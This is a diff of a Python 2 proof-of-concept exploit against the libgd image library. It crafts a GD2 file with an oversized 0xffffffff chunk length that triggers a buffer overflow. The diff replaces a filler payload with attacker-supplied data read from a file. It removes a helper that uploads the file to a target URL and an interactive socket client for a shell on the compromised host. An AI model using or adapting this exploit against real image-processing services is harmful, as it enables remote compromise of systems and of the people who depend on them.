@@ -1,12 +1,9 @@
 #!/usr/bin/env python2
 
 import sys
-import os
 import zlib
-import socket
 from struct import pack
 
-import requests
 
 # gd.h: #define gdMaxColors 256
 gd_max_colors = 256
@@ -39,59 +36,18 @@ def make_gd2(chunks):
     return "".join(gd2 + colors + [data for data, size in chunks])
 
 
-def connect(host, port):
-    addr = socket.gethostbyname(host)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        sock.connect((addr, port))
-    except socket.error:
-        return
-
-    print("\n[+] connected to %s:%d" % (host, port))
-    if os.fork() == 0:
-        while True:
-            try:
-                data = sock.recv(8192)
-            except KeyboardInterrupt:
-                sys.exit("\n[!] receiver aborting")
-            if data == "":
-                sys.exit("[!] receiver aborting")
-            sys.stdout.write(data)
-    else:
-        while True:
-            try:
-                cmd = sys.stdin.readline()
-            except KeyboardInterrupt:
-                sock.close()
-                sys.exit("[!] sender aborting")
-            sock.send(cmd)
-
-
-def send_gd2(url, gd2, code):
-    files = {"file": gd2}
-    try:
-        req = requests.post(url, files=files, timeout=5)
-        code.append(req.status_code)
-    except requests.exceptions.ReadTimeout:
-        pass
-
-
-def get_payload(size):
-    return "B"*size
+def get_overflow_data(path):
+    with open(path) as fd:
+        return fd.read()
 
 
 def main():
-    ofile = sys.argv[1]
-    size = int(sys.argv[2])
-
+    overflow_data = get_overflow_data(sys.argv[1])
     valid = zlib.compress("A" * 100, 0)
-    payload = get_payload(size)
-    gd2 = make_gd2([(valid, len(valid)), (payload, 0xffffffff)])
+    gd2 = make_gd2([(valid, len(valid)), (overflow_data, 0xffffffff)])
 
-    with open(ofile, 'w') as fd:
+    with open(sys.argv[2], 'w') as fd:
         fd.write(gd2)
-
-    print("Payload written to {}".format(ofile))
 
 
 if __name__ == "__main__":
